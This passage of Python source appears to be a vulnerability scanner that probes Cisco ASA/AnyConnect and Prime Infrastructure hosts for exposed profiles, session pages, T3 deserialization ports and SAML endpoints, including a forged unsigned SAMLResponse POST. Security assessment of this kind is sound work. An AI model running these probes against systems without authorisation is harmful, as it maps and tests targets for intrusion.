    # component framework used by Cisco Prime Infrastructure; the JSF ViewState
    # hidden form field is a base64-encoded serialized Java object -- if not
    # cryptographically signed (javax.faces.STATE_SAVING_METHOD=client without
    # HMAC), it is directly injectable with a ysoserial payload.
    sc5, body5 = _http_get('/webacs/pages/common/login.jsf')
    if sc5 in (200, 302) and len(body5) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'PRIME_JAVA_JSF_EXPOSED',
            'detail': (
                f'Cisco Prime Infrastructure JSF login page at '
                f'{host}:{port}/webacs/pages/common/login.jsf returned '
                f'HTTP {sc5} ({len(body5)} bytes).  '
                f'ch2: JSF ViewState is a base64-encoded serialized Java object; '
                f'if server-side state saving is disabled or HMAC absent, '
                f'attacker-controlled ViewState delivers deserialization RCE; '
                f'Prime JSF version determines applicable CVE set.  '
                f'Excerpt: {body5[:300]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for javax.faces version in response
        jsf_ver_match = re.search(
            r'(?i)javax\.faces[^"\'<]{0,30}?(\d+\.\d+(?:\.\d+)?)',
            body5,
        )
        if not jsf_ver_match:
            jsf_ver_match = re.search(
                r'(?i)(?:jsf|faces)[^"\'<]{0,20}?version[^"\'<]{0,10}?(\d+\.\d+)',
                body5,
            )
        if jsf_ver_match:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'PRIME_JSF_VERSION',
                'detail': (
                    f'JSF version "{jsf_ver_match.group(1)}" identified at '
                    f'{host}:{port}/webacs/pages/common/login.jsf.  '
                    f'ch4 (Fingerprinting Code): JSF version disclosure maps to '
                    f'CVE database for ViewState deserialization; cross-reference '
                    f'with Cisco Security Advisory for Prime Infrastructure '
                    f'affected version ranges.  '
                    f'Context: '
                    f'{body5[max(0,jsf_ver_match.start()-20):jsf_ver_match.end()+20]!r}'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 6: T3 protocol ports 7001, 9043, 4848 ---------------------------
    # ch3 (Byte-Level Manipulation): WebLogic T3 is used by Cisco UCS Manager
    # and select Cisco management plane components built on embedded WebLogic;
    # T3 handshake initiates a full Java serialization channel on TCP; response
    # with HELO: or 0xACED confirms live deserialization surface (CVE-2019-2725,
    # CVE-2020-14882 unauthenticated RCE via T3 deserialization).
    T3_PORTS = [7001, 9043, 4848]
    T3_HELLO = b't3 12.2.1\nAS:255\nHL:19\n\n'
    for t3_port in T3_PORTS:
        conn_t3, resp_t3 = _tcp_probe(host, t3_port, T3_HELLO, recv_bytes=128)
        if conn_t3:
            findings.append({
                'severity': 'HIGH',
                'title': 'T3_PROTOCOL_RESPONSIVE',
                'detail': (
                    f'T3/WebLogic protocol TCP/{t3_port} accepted connection on '
                    f'{host} (response: {resp_t3[:32].hex()!r}).  '
                    f'ch3: T3 is WebLogic\'s native inter-component protocol used '
                    f'by Cisco UCS Manager embedded WebLogic; T3 channel is a '
                    f'Java serialization pipe exploitable via gadget chains '
                    f'without pre-authentication (CVE-2019-2725, CVE-2020-14882).'
                ),
                'host': host,
                'port': t3_port,
            })
            # HELO: response or ACED serialization magic confirm live deser surface
            has_helo = b'HELO' in resp_t3
            has_aced = b'\xac\xed' in resp_t3
            has_t3 = b't3' in resp_t3.lower()
            if has_helo or has_aced or has_t3:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'T3_DESERIALIZ_SURFACE',
                    'detail': (
                        f'T3 protocol on {host}:{t3_port} returned T3 handshake '
                        f'response (HELO={has_helo}, ACED={has_aced}, '
                        f't3={has_t3}).  '
                        f'ch2 (Serialization Wire Format): 0xACED0005 in T3 '
                        f'response confirms Java object deserialization on wire; '
                        f'HELO: header is WebLogic T3 acknowledgment; both '
                        f'indicate direct RCE path via ysoserial payload '
                        f'without authentication.  '
                        f'Full response (hex): {resp_t3[:64].hex()!r}'
                    ),
                    'host': host,
                    'port': t3_port,
                })

    return findings


def probe_asa_anyconnect_profile_download(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': (
                    'AnyConnect Darwin_x86_64-apple-darwin15.0.0 4.10.07073'
                ),
                'Accept': 'application/xml,text/xml,*/*',
                'X-Aggregate-Auth': '1',
                'X-AnyConnect-Platform': 'apple-ios',
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                hdrs = dict(r.headers)
                return r.status, body, hdrs
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, {}
        except Exception:
            return None, '', {}

    # profile XML — split tunnel config, server list, DTLS port, group policies
    sc1, body1, _ = _get('/CACHE/stc/profiles/AnyConnectProfile.xml')
    if sc1 == 200 and len(body1) > 100:
        has_split = bool(re.search(r'SplitTunnelPolicy|SplitInclude|SplitExclude', body1, re.I))
        has_server = bool(re.search(r'<HostAddress>|<HostName>', body1, re.I))
        has_dtls = bool(re.search(r'DTLSPort|dtls', body1, re.I))
        group_match = re.search(r'<GroupName>([^<]{1,64})</GroupName>', body1, re.I)
        group_val = group_match.group(1) if group_match else ''
        sev = 'CRITICAL' if has_split else 'HIGH'
        findings.append({
            'severity': sev,
            'title': 'ANYCONNECT_PROFILE_XML_EXPOSED',
            'detail': (
                f'AnyConnect profile XML returned unauthenticated at '
                f'{host}:{port}/CACHE/stc/profiles/AnyConnectProfile.xml '
                f'(len={len(body1)}).  '
                f'split_tunnel={has_split}, server_list={has_server}, '
                f'dtls={has_dtls}, group={group_val!r}.  '
                f'Profile XML discloses split-tunneling ACLs, internal server '
                f'addresses, DTLS port, and group-policy names; an iOS '
                f'AnyConnect client fetches this path pre-auth to build its '
                f'VPN configuration — unauthenticated read leaks full network '
                f'topology and tunnel policy to any requester.'
            ),
            'host': host,
            'port': port,
        })

    # directory listing at /CACHE/stc/profiles/ — enumerates profile names
    sc2, body2, _ = _get('/CACHE/stc/profiles/')
    if sc2 == 200 and re.search(r'\.xml|href=|Index of', body2, re.I):
        xml_names = re.findall(r'href=["\']([^"\']*\.xml)["\']', body2, re.I)
        findings.append({
            'severity': 'HIGH',
            'title': 'ANYCONNECT_PROFILE_DIR_LISTING',
            'detail': (
                f'Directory listing at /CACHE/stc/profiles/ returned '
                f'HTTP 200 on {host}:{port}.  '
                f'Profile files visible: {xml_names[:8]!r}.  '
                f'Enumerable profile filenames allow targeted download of '
                f'every group-policy XML without authentication.'
            ),
            'host': host,
            'port': port,
        })
        for xml_name in xml_names[:6]:
            sc_x, body_x, _ = _get(f'/CACHE/stc/profiles/{xml_name.lstrip("/")}')
            if sc_x == 200 and len(body_x) > 50:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'ANYCONNECT_PROFILE_XML_DOWNLOAD',
                    'detail': (
                        f'Profile file /CACHE/stc/profiles/{xml_name} '
                        f'downloaded without auth on {host}:{port} '
                        f'(len={len(body_x)}).  '
                        f'Additional group-policy XML confirms unauth '
                        f'bulk profile exfiltration path.'
                    ),
                    'host': host,
                    'port': port,
                })

    # /CACHE/stc/ top-level listing — may expose sdesktop/data/ and other dirs
    sc3, body3, _ = _get('/CACHE/stc/')
    if sc3 == 200 and re.search(r'href=|Index of|sdesktop|profiles', body3, re.I):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'CACHE_STC_DIR_LISTING',
            'detail': (
                f'/CACHE/stc/ returned HTTP 200 on {host}:{port} '
                f'with directory content (len={len(body3)}).  '
                f'Exposes compliance-check data paths (sdesktop/data/) '
                f'and profile subdirectory without authentication.'
            ),
            'host': host,
            'port': port,
        })

    # alternate profile path used on older ASA versions
    sc4, body4, _ = _get('/profiles/')
    if sc4 == 200 and len(body4) > 50:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ANYCONNECT_ALT_PROFILE_PATH',
            'detail': (
                f'/profiles/ returned HTTP 200 on {host}:{port} '
                f'(len={len(body4)}).  '
                f'Legacy profile download path active; pre-9.0 ASAs '
                f'served AnyConnect profiles here without auth gate.'
            ),
            'host': host,
            'port': port,
        })

    # /+CSCOE+/clients.xml — client capabilities matrix (OS, versions, features)
    sc5, body5, _ = _get('/+CSCOE+/clients.xml')
    if sc5 == 200 and re.search(r'<client|<platform|AnyConnect', body5, re.I):
        findings.append({
            'severity': 'LOW',
            'title': 'ANYCONNECT_CLIENTS_XML_EXPOSED',
            'detail': (
                f'/+CSCOE+/clients.xml returned HTTP 200 on {host}:{port} '
                f'(len={len(body5)}).  '
                f'Client capability matrix discloses supported OS list, '
                f'minimum AnyConnect versions, and feature flags; '
                f'aids iOS client downgrade and version-targeted exploit selection.'
            ),
            'host': host,
            'port': port,
        })

    # /+CSCOE+/endpoint.html — Host Scan / CSD compliance check page
    sc6, body6, _ = _get('/+CSCOE+/endpoint.html')
    if sc6 in (200, 302) and len(body6) > 20:
        has_csd = bool(re.search(r'HostScan|CSD|csd|sdesktop|endpoint', body6, re.I))
        findings.append({
            'severity': 'INFO',
            'title': 'ANYCONNECT_HOST_SCAN_PAGE',
            'detail': (
                f'/+CSCOE+/endpoint.html HTTP {sc6} on {host}:{port}.  '
                f'host_scan_indicators={has_csd}.  '
                f'Endpoint assessment / Host Scan active; ASA queries '
                f'iOS device compliance before granting tunnel; '
                f'page fingerprints CSD version and compliance requirements.'
            ),
            'host': host,
            'port': port,
        })

    # /CACHE/sdesktop/data/ — Host Scan compliance check app download path
    sc7, body7, _ = _get('/CACHE/sdesktop/data/')
    if sc7 == 200 and len(body7) > 20:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SDESKTOP_DATA_EXPOSED',
            'detail': (
                f'/CACHE/sdesktop/data/ returned HTTP {sc7} on {host}:{port} '
                f'(len={len(body7)}).  '
                f'Host Scan compliance app served without auth; '
                f'binary download path used by AnyConnect iOS client '
                f'to fetch the posture assessment module.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_mobile_vpn_surface(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _get(path, extra_headers=None):
        url = f'{base}{path}'
        hdrs = {
            'User-Agent': (
                'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) '
                'AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A362'
            ),
            'Accept': 'text/html,application/xhtml+xml,*/*;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                hdrs_resp = dict(r.headers)
                return r.status, body, hdrs_resp
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, {}
        except Exception:
            return None, '', {}

    # /+CSCOE+/portal.html — clientless WebVPN portal (post-auth gate check)
    sc1, body1, h1 = _get('/+CSCOE+/portal.html')
    if sc1 == 200 and re.search(r'webvpn|portal|clientless|bookmark', body1, re.I):
        findings.append({
            'severity': 'HIGH',
            'title': 'CLIENTLESS_VPN_PORTAL_UNAUTH_ACCESS',
            'detail': (
                f'Clientless WebVPN portal /+CSCOE+/portal.html returned '
                f'HTTP 200 without valid session cookie on {host}:{port}.  '
                f'Unauthenticated portal access exposes bookmark injection '
                f'surface, internal URL proxying, and RDP/SSH web gateway; '
                f'iOS Safari user-agent accepted by portal middleware without '
                f'client certificate or session validation.'
            ),
            'host': host,
            'port': port,
        })
    elif sc1 in (302, 301):
        loc = h1.get('Location', '')
        findings.append({
            'severity': 'INFO',
            'title': 'CLIENTLESS_PORTAL_REDIRECT',
            'detail': (
                f'/+CSCOE+/portal.html redirected HTTP {sc1} -> {loc!r} '
                f'on {host}:{port}.  '
                f'Portal active; redirect destination confirms auth state machine '
                f'path (logon.html = unauthenticated gate).'
            ),
            'host': host,
            'port': port,
        })

    # /+CSCOE+/win.js — browser/OS detection script revealing supported platform matrix
    sc2, body2, _ = _get('/+CSCOE+/win.js')
    if sc2 == 200 and len(body2) > 100:
        os_list = re.findall(r'["\']([^"\']*(?:ios|android|iphone|ipad|mac|windows)[^"\']*)["\']',
                             body2, re.I)
        findings.append({
            'severity': 'LOW',
            'title': 'WINJS_OS_DETECTION_EXPOSED',
            'detail': (
                f'/+CSCOE+/win.js returned HTTP 200 on {host}:{port} '
                f'(len={len(body2)}).  '
                f'OS detection patterns (sample): {os_list[:5]!r}.  '
                f'Reveals supported-platform matrix and client detection '
                f'logic; iOS UA strings that pass detection can access '
                f'mobile-specific portal paths without agent install.'
            ),
            'host': host,
            'port': port,
        })

    # /+CSCOE+/otp.html — OTP challenge page; presence confirms MFA posture
    sc3, body3, _ = _get('/+CSCOE+/otp.html')
    if sc3 in (200, 302) and len(body3) > 20:
        has_otp_form = bool(re.search(r'otp|one.time|passcode|rsa|totp|token', body3, re.I))
        findings.append({
            'severity': 'INFO',
            'title': 'OTP_CHALLENGE_PAGE_ACTIVE',
            'detail': (
                f'/+CSCOE+/otp.html HTTP {sc3} on {host}:{port}.  '
                f'otp_form_present={has_otp_form}.  '
                f'OTP/second-factor challenge page exposed without '
                f'existing session; reveals MFA method (RSA SecurID, TOTP, '
                f'SMS) and challenge framing; absence of rate-limit headers '
                f'indicates online OTP brute-force may be feasible.'
            ),
            'host': host,
            'port': port,
        })

    # /webvpn.html — legacy WebVPN login; timing delta reveals valid usernames
    import time as _time
    t_start = _time.monotonic()
    sc4, body4, _ = _get('/webvpn.html')
    t_delta = _time.monotonic() - t_start
    if sc4 in (200, 302) and len(body4) > 20:
        has_form = bool(re.search(r'<form|username|password|LOGIN', body4, re.I))
        findings.append({
            'severity': 'MEDIUM' if has_form else 'INFO',
            'title': 'WEBVPN_LOGIN_PAGE_ACTIVE',
            'detail': (
                f'/webvpn.html HTTP {sc4} on {host}:{port} '
                f'(response_time={t_delta:.3f}s, form={has_form}).  '
                f'Legacy WebVPN login page active; timing-differential '
                f'username enumeration feasible if backend auth check '
                f'returns before lockout logic; iOS client fallback to '
                f'WebVPN mode uses this path when AnyConnect tunnel fails.'
            ),
            'host': host,
            'port': port,
        })

    # /+CSCOE+/logout.html — CSRF token present in logout form
    sc5, body5, _ = _get('/+CSCOE+/logout.html')
    if sc5 in (200, 302) and len(body5) > 20:
        csrf_match = re.search(
            r'csrf[_-]?token["\']?\s*[=:value\s]+["\']?([A-Za-z0-9+/=_\-]{8,64})',
            body5, re.I
        )
        hidden_match = re.search(
            r'<input[^>]+name=["\']?(?:csrf|_token|token)["\']?[^>]+value=["\']([^"\']{6,64})["\']',
            body5, re.I
        )
        csrf_val = (csrf_match.group(1) if csrf_match else
                    (hidden_match.group(1) if hidden_match else ''))
        sev = 'MEDIUM' if csrf_val else 'INFO'
        findings.append({
            'severity': sev,
            'title': 'LOGOUT_CSRF_TOKEN_EXPOSED',
            'detail': (
                f'/+CSCOE+/logout.html HTTP {sc5} on {host}:{port}.  '
                f'csrf_token={csrf_val!r}.  '
                f'Logout form CSRF token leaked to unauthenticated '
                f'requester; if token is static or session-independent '
                f'it enables CSRF-forced logout or token replay; '
                f'iOS AnyConnect uses this endpoint to terminate the '
                f'VPN session via HTTPS DELETE equivalent.'
            ),
            'host': host,
            'port': port,
        })

    # /+CSCOE+/session.html — active session info; only meaningful with valid cookie
    sc6, body6, _ = _get('/+CSCOE+/session.html')
    if sc6 == 200 and re.search(r'session|username|tunnel|group|ip.addr', body6, re.I):
        user_match = re.search(r'Username[:\s]+([^\s<"\']{2,32})', body6, re.I)
        ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', body6)
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SESSION_INFO_UNAUTH_DISCLOSURE',
            'detail': (
                f'/+CSCOE+/session.html returned HTTP 200 with session data '
                f'without valid auth cookie on {host}:{port}.  '
                f'user={user_match.group(1) if user_match else "n/a"}, '
                f'ip={ip_match.group(1) if ip_match else "n/a"}.  '
                f'Active VPN session metadata disclosed to unauthenticated '
                f'iOS client; leaks tunnel group, assigned IP, and username '
                f'of active sessions.'
            ),
            'host': host,
            'port': port,
        })
    elif sc6 == 200:
        findings.append({
            'severity': 'INFO',
            'title': 'SESSION_ENDPOINT_ACCESSIBLE',
            'detail': (
                f'/+CSCOE+/session.html HTTP 200 on {host}:{port} '
                f'(no session data without valid cookie; endpoint live).  '
                f'Session status API surface confirmed active.'
            ),
            'host': host,
            'port': port,
        })

    # MDM redirect URL in profile or portal — mobile device enrollment pivot
    combined = body1 + body4 + body5
    mdm_match = re.search(r'https?://[^\s"\'<>]{4,80}(?:mdm|jamf|intune|airwatch|kandji|mosyle)[^\s"\'<>]{0,40}',
                           combined, re.I)
    if mdm_match:
        findings.append({
            'severity': 'LOW',
            'title': 'MDM_REDIRECT_URL_DISCLOSED',
            'detail': (
                f'MDM enrollment redirect URL found in portal/login pages '
                f'on {host}:{port}: {mdm_match.group(0)!r}.  '
                f'MDM platform identity disclosed; enables targeted '
                f'MDM API enumeration and iOS device enrollment bypass research.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_ios_client_redirect_surface(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _get(path, follow=False):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': (
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) '
                    'AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A329'
                ),
                'Accept': 'text/html,application/xhtml+xml,*/*;q=0.9',
                'Accept-Language': 'en-US,en;q=0.9',
            },
        )
        if not follow:
            opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
            opener.addheaders = list(req.headers.items())
            try:
                class _NoRedirect(urllib.request.HTTPErrorProcessor):
                    def http_response(self, request, response):
                        return response
                    https_response = http_response
                no_redir = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx),
                    _NoRedirect,
                )
                with no_redir.open(req, timeout=timeout) as r:
                    body = r.read().decode('utf-8', errors='replace')
                    hdrs = dict(r.headers)
                    return r.status, body, hdrs
            except urllib.error.HTTPError as e:
                body = ''
                try:
                    body = e.read().decode('utf-8', errors='replace')
                except Exception:
                    pass
                return e.code, body, dict(e.headers)
            except Exception:
                return None, '', {}
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, {}
        except Exception:
            return None, '', {}

    ios_scheme_re = re.compile(r'(anyconnect|cisco|ciscovpn)://', re.I)

    redirect_paths = [
        '/+CSCOE+/',
        '/+CSCOE+/logon.html',
        '/+CSCOE+/portal.html',
        '/+CSCOE+/start.html',
        '/+CSCOE+/home.html',
        '/remote/login',
        '/vpn/',
    ]

    for path in redirect_paths:
        sc, body, hdrs = _get(path)
        if sc is None:
            continue
        loc = hdrs.get('Location', '') or hdrs.get('location', '')
        if ios_scheme_re.search(loc):
            findings.append({
                'severity': 'HIGH',
                'title': 'IOS_URL_SCHEME_OPEN_REDIRECT_LOCATION',
                'detail': (
                    f'Path {path} on {host}:{port} returned HTTP {sc} with '
                    f'Location: {loc!r} — custom iOS URL scheme in redirect.  '
                    f'A server-controlled Location header targeting anyconnect:// '
                    f'or cisco:// triggers app-launch on iOS; combined with a '
                    f'crafted URI payload this can seed malicious VPN server '
                    f'configuration or capture authentication tokens via '
                    f'scheme-handler argument injection.'
                ),
                'host': host,
                'port': port,
            })
        if sc in (200, 302, 301) and body:
            meta_match = re.search(
                r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*url\s*=\s*([^\s"\'<>]{4,200})',
                body, re.I
            )
            js_match = re.search(
                r'(?:window\.location|location\.href|location\.replace)\s*[=(]\s*["\']([^"\']{4,200}anyconnect|[^"\']{4,200}cisco://[^"\']{0,200})["\']',
                body, re.I
            )
            for match_val in [
                meta_match.group(1) if meta_match else '',
                js_match.group(1) if js_match else '',
            ]:
                if match_val and ios_scheme_re.search(match_val):
                    findings.append({
                        'severity': 'HIGH',
                        'title': 'IOS_URL_SCHEME_IN_PAGE_REDIRECT',
                        'detail': (
                            f'Path {path} on {host}:{port} (HTTP {sc}) contains '
                            f'in-page redirect to iOS URL scheme: {match_val[:120]!r}.  '
                            f'Meta-refresh or JS location assignment to anyconnect:// '
                            f'launches AnyConnect on iOS visitors; attacker controlling '
                            f'portal content (XSS, bookmark injection) can force '
                            f'scheme-based app invocation without user interaction '
                            f'beyond page load.'
                        ),
                        'host': host,
                        'port': port,
                    })
                    break

    sc_p, body_p, _ = _get('/+CSCOE+/portal.html')
    if sc_p in (200, 302, 301) and body_p:
        scheme_hits = ios_scheme_re.findall(body_p)
        if scheme_hits:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'IOS_SCHEME_REFS_IN_PORTAL_HTML',
                'detail': (
                    f'/+CSCOE+/portal.html on {host}:{port} (HTTP {sc_p}) '
                    f'contains {len(scheme_hits)} reference(s) to iOS URL schemes '
                    f'({list(set(s.lower() for s in scheme_hits))!r}://).  '
                    f'Portal JavaScript uses scheme references to hand off to the '
                    f'native AnyConnect app; visible to any unauthenticated '
                    f'iOS Safari client that reaches the portal, enabling app '
                    f'launch fingerprinting and targeted scheme-argument fuzzing.'
                ),
                'host': host,
                'port': port,
            })

    apns_paths = [
        '/push/',
        '/push/register',
        '/notify/',
        '/notify/push',
        '/apns/',
        '/apns/register',
        '/+CSCOE+/push',
        '/+CSCOE+/notify',
        '/+CSCOE+/apns',
        '/mdm/push',
        '/mdm/notify',
    ]

    for apath in apns_paths:
        sc_a, body_a, hdrs_a = _get(apath)
        if sc_a is None:
            continue
        ct = hdrs_a.get('Content-Type', '') or hdrs_a.get('content-type', '')
        if sc_a in (200, 201, 400, 405) and (
            re.search(r'push|apns|token|device|notify|register', body_a, re.I)
            or re.search(r'push|apns|notify', ct, re.I)
        ):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'ASA_PUSH_NOTIFY_ENDPOINT_ACTIVE',
                'detail': (
                    f'APNS/push path {apath} returned HTTP {sc_a} '
                    f'on {host}:{port} (Content-Type: {ct!r}).  '
                    f'Body keywords: push/apns/token/notify present.  '
                    f'ASA MDM-integrated deployments expose push notification '
                    f'registration endpoints; an attacker with access can '
                    f'register a rogue device token or enumerate registered '
                    f'device identifiers used for Cisco Security Connector '
                    f'policy delivery.'
                ),
                'host': host,
                'port': port,
            })
        elif sc_a == 200 and len(body_a) > 20:
            findings.append({
                'severity': 'INFO',
                'title': 'PUSH_PATH_HTTP200',
                'detail': (
                    f'{apath} returned HTTP 200 on {host}:{port} '
                    f'(len={len(body_a)}, ct={ct!r}); content not push-keyed — '
                    f'may be portal fallback or unrelated handler.'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_webvpn_session_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _req(method, path, post_data=None, extra_headers=None):
        url = f'{base}{path}'
        data = post_data.encode('utf-8') if isinstance(post_data, str) else post_data
        hdrs = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        if extra_headers:
            hdrs.update(extra_headers)
        if data:
            hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body, dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    def _get(path, extra_headers=None):
        return _req('GET', path, extra_headers=extra_headers)

    def _post(path, body_str, extra_headers=None):
        return _req('POST', path, post_data=body_str, extra_headers=extra_headers)

    sc1, body1, hdrs1 = _get('/+CSCOE+/session.html')
    if sc1 == 200:
        session_id_match = re.search(
            r'(?:session.?id|webvpn.?session|token)\s*[=:]\s*["\']?([A-Za-z0-9+/=_\-]{16,128})',
            body1, re.I
        )
        user_match = re.search(r'[Uu]sername[:\s]+([^\s<"\']{2,32})', body1)
        ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', body1)
        has_session_data = bool(
            re.search(r'session|tunnel|username|vpn.?user|group|authenticated', body1, re.I)
        )
        sev = 'CRITICAL' if (session_id_match or user_match) else ('HIGH' if has_session_data else 'MEDIUM')
        _sid_val = repr(session_id_match.group(1)[:24]) if session_id_match else '"n/a"'
        findings.append({
            'severity': sev,
            'title': 'WEBVPN_SESSION_ENDPOINT_EXPOSED',
            'detail': (
                f'/+CSCOE+/session.html returned HTTP 200 on {host}:{port} '
                f'(len={len(body1)}).  '
                f'session_id_present={bool(session_id_match)}, '
                f'session_id={_sid_val}, '
                f'user={user_match.group(1) if user_match else "n/a"}, '
                f'ip={ip_match.group(1) if ip_match else "n/a"}, '
                f'has_session_data={has_session_data}.  '
                f'WKWebView-hosted clientless portal loads this endpoint to '
                f'read session state; unauthenticated 200 may expose active '
                f'session tokens readable by JavaScript in the same web view '
                f'origin, enabling same-origin session hijack from XSS.'
            ),
            'host': host,
            'port': port,
        })
    elif sc1 is not None:
        findings.append({
            'severity': 'INFO',
            'title': 'WEBVPN_SESSION_ENDPOINT_STATUS',
            'detail': (
                f'/+CSCOE+/session.html HTTP {sc1} on {host}:{port}; '
                f'endpoint present, requires authentication.'
            ),
            'host': host,
            'port': port,
        })

    saml_dummy = (
        'SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0'
        'FNTDI6Mi4wOnByb3RvY29sIj48U3RhdHVzPjxTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFt'
        'ZXM6dGM6U0FNTDI6Mi4wOnN0YXR1czpTdWNjZXNzIi8+PC9TdGF0dXM+PC9zYW1scDpSZXNwb25zZT4='
        '&RelayState=/'
    )
    sc2, body2, hdrs2 = _post(
        '/+CSCOE+/saml/sp/acs',
        saml_dummy,
        extra_headers={'Content-Type': 'application/x-www-form-urlencoded'},
    )
    if sc2 is not None:
        set_cookie = hdrs2.get('Set-Cookie', '') or hdrs2.get('set-cookie', '')
        loc2 = hdrs2.get('Location', '') or hdrs2.get('location', '')
        has_webvpn_cookie = bool(re.search(r'webvpn=', set_cookie, re.I))
        sev2 = 'CRITICAL' if has_webvpn_cookie else ('HIGH' if sc2 in (200, 302) else 'MEDIUM')
        findings.append({
            'severity': sev2,
            'title': 'SAML_ACS_ENDPOINT_ACTIVE',
            'detail': (
                f'/+CSCOE+/saml/sp/acs POST returned HTTP {sc2} on {host}:{port}.  '
                f'webvpn_cookie_issued={has_webvpn_cookie}, '
                f'location={loc2!r}, '
                f'set-cookie_header={set_cookie[:120]!r}.  '
                f'SAML ACS endpoint accepts POST; a forged or replayed SAMLResponse '
                f'(e.g. from a compromised IdP certificate or XML signature wrapping) '
                f'may yield a webvpn= session cookie without valid credentials; '
                f'AnyConnect iOS WKWebView SSO flows POST to this path after IdP redirect.'
            ),
            'host': host,
            'port': port,
        })

    sc3, body3, hdrs3 = _get('/+CSCOE+/saml/sp/metadata')
    if sc3 == 200 and len(body3) > 50:
        entity_match = re.search(r'entityID=["\']([^"\']{4,200})["\']', body3, re.I)
        acs_match = re.search(r'AssertionConsumerService[^/]{0,60}Location=["\']([^"\']{4,300})["\']', body3, re.I)
        cert_match = re.search(r'<ds:X509Certificate>([A-Za-z0-9+/=\s]{20,})</ds:X509Certificate>', body3, re.I)
        cert_snip = cert_match.group(1)[:40].strip() if cert_match else ''
        sev3 = 'CRITICAL' if (entity_match or acs_match or cert_match) else 'HIGH'
        _eid_val = repr(entity_match.group(1)[:80]) if entity_match else '"n/a"'
        _acs_val = repr(acs_match.group(1)[:100]) if acs_match else '"n/a"'
        findings.append({
            'severity': sev3,
            'title': 'SAML_SP_METADATA_EXPOSED',
            'detail': (
                f'/+CSCOE+/saml/sp/metadata returned HTTP 200 on {host}:{port} '
                f'(len={len(body3)}).  '
                f'entityID={_eid_val}, '
                f'acs_url={_acs_val}, '
                f'sp_cert_present={bool(cert_match)}, '
                f'cert_snip={cert_snip!r}.  '
                f'SP metadata discloses the SAML entityID (used as issuer in forged '
                f'assertions), the ACS URL (POST target), and the SP signing certificate; '
                f'an attacker with IdP access or signature bypass can craft a valid '
                f'SAMLResponse and obtain a webvpn= cookie.'
            ),
            'host': host,
            'port': port,
        })
    elif sc3 is not None:
        findings.append({
            'severity': 'INFO',
            'title': 'SAML_SP_METADATA_STATUS',
            'detail': (
                f'/+CSCOE+/saml/sp/metadata HTTP {sc3} on {host}:{port}; '
                f'{"SAML SP configured" if sc3 == 403 else "endpoint not present or auth-gated"}.'
            ),
            'host': host,
            'port': port,
        })

